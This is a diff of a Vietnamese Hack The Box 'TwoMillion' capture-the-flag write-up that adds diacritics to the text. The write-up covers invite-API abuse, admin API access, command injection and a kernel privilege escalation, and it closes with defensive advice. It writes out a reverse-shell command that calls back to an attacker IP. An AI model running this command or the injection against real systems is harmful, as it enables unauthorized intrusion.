@@ -1,6 +1,6 @@
 ---
 title: "TwoMillion"
-description: "Khai thac invite API, leo quyen admin qua API, tan cong command injection tren VPN generator va privilege escalation bang kernel exploit."
+description: "Khai thác invite API, leo quyền admin qua API, tấn công command injection trên VPN generator và privilege escalation bằng kernel exploit."
 platform: "Hack The Box"
 category: "Linux"
 difficulty: "Easy"
@@ -11,156 +11,156 @@ featured: true
 cover: "/images/twomillion/two-million-02.png"
 ---
 
-> Write-up nay duoc thuc hien trong moi truong lab co kiem soat. Chi ap dung cac ky thuat ben duoi tren he thong ma ban duoc phep kiem thu.
+> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.
 
-## Quet dich vu
+## Quét dịch vụ
 
-Kiem tra cac port TCP dang mo tren may muc tieu:
+Kiểm tra các port TCP đang mở trên máy mục tiêu:
 
-![Ket qua quet Nmap](/images/twomillion/two-million-01.png)
+![Kết quả quét Nmap](/images/twomillion/two-million-01.png)
 
-May muc tieu co dich vu web dang chay, vi vay bat dau bang viec truy cap ung dung va quan sat cac file JavaScript duoc load:
+Máy mục tiêu có dịch vụ web đang chạy, vì vậy bắt đầu bằng việc truy cập ứng dụng và quan sát các file JavaScript được load:
 
-![Kiem tra ung dung web va file JavaScript](/images/twomillion/two-million-02.png)
+![Kiểm tra ứng dụng web và file JavaScript](/images/twomillion/two-million-02.png)
 
-## Phan tich invite code API
+## Phân tích invite code API
 
-Truy cap file JavaScript cua ung dung:
+Truy cập file JavaScript của ứng dụng:
 
-![Truy cap file JavaScript](/images/twomillion/two-million-03.png)
+![Truy cập file JavaScript](/images/twomillion/two-million-03.png)
 
-File JavaScript bi obfuscate, nen copy phan code nay dua qua cong cu deobfuscate de doc logic ben trong:
+File JavaScript bị obfuscate, nên copy phần code này đưa qua công cụ deobfuscate để đọc logic bên trong:
 
-![Noi dung JavaScript sau khi deobfuscate](/images/twomillion/two-million-04.png)
+![Nội dung JavaScript sau khi deobfuscate](/images/twomillion/two-million-04.png)
 
-Trong ham `makeInviteCode`, ung dung goi den endpoint:
+Trong hàm `makeInviteCode`, ứng dụng gọi đến endpoint:
 
 ```text
 /api/v1/invite/how/to/generate
 ```
 
-![Ham makeInviteCode goi endpoint goi y cach tao invite](/images/twomillion/two-million-05.png)
+![Hàm makeInviteCode gọi endpoint gợi ý cách tạo invite](/images/twomillion/two-million-05.png)
 
-Khi goi endpoint nay, API tra ve mot chuoi da ma hoa. Sau khi decode, noi dung nhan duoc la:
+Khi gọi endpoint này, API trả về một chuỗi đã mã hóa. Sau khi decode, nội dung nhận được là:
 
 ```text
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
 ```
 
-![API tra ve huong dan tao invite code](/images/twomillion/two-million-06.png)
+![API trả về hướng dẫn tạo invite code](/images/twomillion/two-million-06.png)
 
-Chuoi tra ve la Base64. Tiep tuc goi `POST /api/v1/invite/generate`, decode ket qua va thu duoc invite code:
+Chuỗi trả về là Base64. Tiếp tục gọi `POST /api/v1/invite/generate`, decode kết quả và thu được invite code:
 
 ```text
 SZ1JG-326ND-L51VI-8OK7K
 ```
 
-Luu y: invite code chi su dung duoc mot lan. Neu can code moi, chi can goi lai endpoint generate.
+Lưu ý: invite code chỉ sử dụng được một lần. Nếu cần code mới, chỉ cần gọi lại endpoint generate.
 
-![Decode invite code tu Base64](/images/twomillion/two-million-07.png)
+![Decode invite code từ Base64](/images/twomillion/two-million-07.png)
 
-## Dang ky va enumerate API
+## Đăng ký và enumerate API
 
-Dung invite code de tao tai khoan, sau do truy cap trang Access va bat Burp Suite de quan sat request:
+Dùng invite code để tạo tài khoản, sau đó truy cập trang Access và bật Burp Suite để quan sát request:
 
-![Dang ky tai khoan bang invite code](/images/twomillion/two-million-08.png)
+![Đăng ký tài khoản bằng invite code](/images/twomillion/two-million-08.png)
 
-![Quan sat request trong Burp Suite](/images/twomillion/two-million-09.png)
+![Quan sát request trong Burp Suite](/images/twomillion/two-million-09.png)
 
-Thu enumerate API:
+Thử enumerate API:
 
-![Enumerate cac API endpoint](/images/twomillion/two-million-10.png)
+![Enumerate các API endpoint](/images/twomillion/two-million-10.png)
 
-Lan dau request bi tra ve `401 Unauthorized` vi chua login. Dang nhap bang tai khoan vua tao:
+Lần đầu request bị trả về `401 Unauthorized` vì chưa login. Đăng nhập bằng tài khoản vừa tạo:
 
-![Dang nhap tai khoan moi tao](/images/twomillion/two-million-11.png)
+![Đăng nhập tài khoản mới tạo](/images/twomillion/two-million-11.png)
 
-![API tra ve thong tin sau khi da login](/images/twomillion/two-million-12.png)
+![API trả về thông tin sau khi đã login](/images/twomillion/two-million-12.png)
 
-Luc nay co the thay co cac endpoint nam duoi `/api/v1/admin`. Day la be mat tan cong quan trong vi chung lien quan den quyen admin va chuc nang tao VPN.
+Lúc này có thể thấy có các endpoint nằm dưới `/api/v1/admin`. Đây là bề mặt tấn công quan trọng vì chúng liên quan đến quyền admin và chức năng tạo VPN.
 
-## Khai thac API admin
+## Khai thác API admin
 
-Thu lan luot cac endpoint admin va payload injection. Endpoint dang chu y la:
+Thử lần lượt các endpoint admin và payload injection. Endpoint đáng chú ý là:
 
 ```text
 /api/v1/admin/vpn/generate
 ```
 
-Endpoint nay co the bi command injection thong qua du lieu dau vao:
+Endpoint này có thể bị command injection thông qua dữ liệu đầu vào:
 
-![Phat hien command injection tren API tao VPN](/images/twomillion/two-million-13.png)
+![Phát hiện command injection trên API tạo VPN](/images/twomillion/two-million-13.png)
 
-Dung reverse shell de may target chu dong ket noi ve may local:
+Dùng reverse shell để máy target chủ động kết nối về máy local:
 
 ```bash
 sh -i >& /dev/tcp/10.10.14.69/9001 0>&1
 ```
 
-![Gui payload reverse shell qua API](/images/twomillion/two-million-14.png)
+![Gửi payload reverse shell qua API](/images/twomillion/two-million-14.png)
 
-Sau khi co shell, doc cac thong tin cau hinh va thu duoc thong tin dang nhap:
+Sau khi có shell, đọc các thông tin cấu hình và thu được thông tin đăng nhập:
 
-![Thu duoc thong tin dang nhap tren may target](/images/twomillion/two-million-15.png)
+![Thu được thông tin đăng nhập trên máy target](/images/twomillion/two-million-15.png)
 
-Thu ket noi SSH den may target:
+Thử kết nối SSH đến máy target:
 
-![Ket noi SSH bang credential thu duoc](/images/twomillion/two-million-16.png)
+![Kết nối SSH bằng credential thu được](/images/twomillion/two-million-16.png)
 
-![Doc user flag](/images/twomillion/two-million-17.png)
+![Đọc user flag](/images/twomillion/two-million-17.png)
 
-Nhu vay ta da lay duoc user flag trong thu muc cua user `admin`.
+Như vậy ta đã lấy được user flag trong thư mục của user `admin`.
 
 ## Privilege escalation
 
-Dua vao goi y cua Hack The Box va thong tin tren may, tiep tuc tim vector leo thang dac quyen:
+Dựa vào gợi ý của Hack The Box và thông tin trên máy, tiếp tục tìm vector leo thang đặc quyền:
 
-![Goi y ve huong privilege escalation](/images/twomillion/two-million-18.png)
+![Gợi ý về hướng privilege escalation](/images/twomillion/two-million-18.png)
 
-![Thong tin kernel va moi truong he thong](/images/twomillion/two-million-19.png)
+![Thông tin kernel và môi trường hệ thống](/images/twomillion/two-million-19.png)
 
-Tu cac thong tin thu duoc, day la mot vulnerability co the dung de leo thang dac quyen tren Linux kernel. Su dung exploit open source tren GitHub:
+Từ các thông tin thu được, đây là một vulnerability có thể dùng để leo thang đặc quyền trên Linux kernel. Sử dụng exploit open source trên GitHub:
 
-![Tai exploit open source tu GitHub](/images/twomillion/two-million-20.png)
+![Tải exploit open source từ GitHub](/images/twomillion/two-million-20.png)
 
-Tao HTTP server tren may local de may target tai file exploit:
+Tạo HTTP server trên máy local để máy target tải file exploit:
 
-![Mo HTTP server tren may local](/images/twomillion/two-million-21.png)
+![Mở HTTP server trên máy local](/images/twomillion/two-million-21.png)
 
-![May target tai file exploit](/images/twomillion/two-million-22.png)
+![Máy target tải file exploit](/images/twomillion/two-million-22.png)
 
-Mo hai tab terminal: mot tab chay script exploit, tab con lai dung de truy cap shell quyen root:
+Mở hai tab terminal: một tab chạy script exploit, tab còn lại dùng để truy cập shell quyền root:
 
-![Chay exploit privilege escalation](/images/twomillion/two-million-23.png)
+![Chạy exploit privilege escalation](/images/twomillion/two-million-23.png)
 
-![Lay duoc shell root](/images/twomillion/two-million-24.png)
+![Lấy được shell root](/images/twomillion/two-million-24.png)
 
-## Tong ket
+## Tổng kết
 
 ### Exploit API
 
-Phan khai thac API trong TwoMillion co hai diem quan trong:
+Phần khai thác API trong TwoMillion có hai điểm quan trọng:
 
-- Ung dung de lo logic tao invite code o client-side JavaScript. Dung deobfuscate co the doc duoc endpoint noi bo `/api/v1/invite/how/to/generate`, tu do lan ra endpoint `POST /api/v1/invite/generate` de tao invite code hop le.
-- Cac endpoint admin khong duoc bao ve chat che theo dung mo hinh phan quyen. Sau khi co account va enumerate API, attacker co the tiep can cac endpoint duoi `/api/v1/admin`, dac biet la chuc nang generate VPN.
-- Endpoint `/api/v1/admin/vpn/generate` xu ly input khong an toan va dua du lieu nguoi dung vao command he thong. Day la command injection, cho phep chen payload reverse shell va lay foothold tren may target.
+- Ứng dụng để lộ logic tạo invite code ở client-side JavaScript. Dùng deobfuscate có thể đọc được endpoint nội bộ `/api/v1/invite/how/to/generate`, từ đó lần ra endpoint `POST /api/v1/invite/generate` để tạo invite code hợp lệ.
+- Các endpoint admin không được bảo vệ chặt chẽ theo đúng mô hình phân quyền. Sau khi có account và enumerate API, attacker có thể tiếp cận các endpoint dưới `/api/v1/admin`, đặc biệt là chức năng generate VPN.
+- Endpoint `/api/v1/admin/vpn/generate` xử lý input không an toàn và đưa dữ liệu người dùng vào command hệ thống. Đây là command injection, cho phép chèn payload reverse shell và lấy foothold trên máy target.
 
-**Khuyen nghi phong thu:**
+**Khuyến nghị phòng thủ:**
 
-- Khong dat logic bao mat quan trong o client-side; JavaScript tren trinh duyet luon co the bi doc, deobfuscate va debug.
-- Tat ca endpoint API can kiem tra authentication va authorization o server-side, dac biet voi endpoint admin.
-- Khong noi chuoi input nguoi dung vao shell command. Neu bat buoc goi command he thong, can dung argument array, whitelist gia tri hop le va validate chat dau vao.
-- Ghi log va canh bao cac request bat thuong den endpoint admin, nhat la cac payload co ky tu shell nhu `;`, `&`, `|`, `$()`, backtick hoac redirect.
+- Không đặt logic bảo mật quan trọng ở client-side; JavaScript trên trình duyệt luôn có thể bị đọc, deobfuscate và debug.
+- Tất cả endpoint API cần kiểm tra authentication và authorization ở server-side, đặc biệt với endpoint admin.
+- Không nối chuỗi input người dùng vào shell command. Nếu bắt buộc gọi command hệ thống, cần dùng argument array, whitelist giá trị hợp lệ và validate chặt đầu vào.
+- Ghi log và cảnh báo các request bất thường đến endpoint admin, nhất là các payload có ký tự shell như `;`, `&`, `|`, `$()`, backtick hoặc redirect.
 
 ### Privilege escalation
 
-Sau khi co SSH vao user `admin`, muc tieu tiep theo la kiem tra thong tin he dieu hanh, kernel va cac goi dang cai. Goi y tu HTB cung voi thong tin tren may cho thay kernel dang ton tai mot loi co exploit cong khai. Khi exploit thanh cong, attacker co the chuyen tu user thuong len root va doc `root.txt`.
+Sau khi có SSH vào user `admin`, mục tiêu tiếp theo là kiểm tra thông tin hệ điều hành, kernel và các gói đang cài. Gợi ý từ HTB cùng với thông tin trên máy cho thấy kernel đang tồn tại một lỗi có exploit công khai. Khi exploit thành công, attacker có thể chuyển từ user thường lên root và đọc `root.txt`.
 
-Day la mau privilege escalation pho bien trong CTF/lab: foothold ban dau den tu ung dung web, sau do leo quyen dua tren cau hinh he dieu hanh hoac kernel chua duoc cap nhat.
+Đây là mẫu privilege escalation phổ biến trong CTF/lab: foothold ban đầu đến từ ứng dụng web, sau đó leo quyền dựa trên cấu hình hệ điều hành hoặc kernel chưa được cập nhật.
 
-**Khuyen nghi phong thu:**
+**Khuyến nghị phòng thủ:**
 
-- Cap nhat kernel va security patch dinh ky, uu tien cac CVE co exploit cong khai.
-- Ap dung nguyen tac least privilege cho user chay ung dung web va user he thong.
-- Bat cac co che hardening nhu AppArmor/SELinux, restrict unprivileged user namespaces neu khong can thiet.
-- Giam sat hanh vi bat thuong sau khai thac, vi du tai exploit ve `/tmp`, chay binary la, hoac mo ket noi nguoc ve IP ben ngoai.
+- Cập nhật kernel và security patch định kỳ, ưu tiên các CVE có exploit công khai.
+- Áp dụng nguyên tắc least privilege cho user chạy ứng dụng web và user hệ thống.
+- Bật các cơ chế hardening như AppArmor/SELinux, restrict unprivileged user namespaces nếu không cần thiết.
+- Giám sát hành vi bất thường sau khai thác, ví dụ tải exploit về `/tmp`, chạy binary lạ, hoặc mở kết nối ngược về IP bên ngoài.
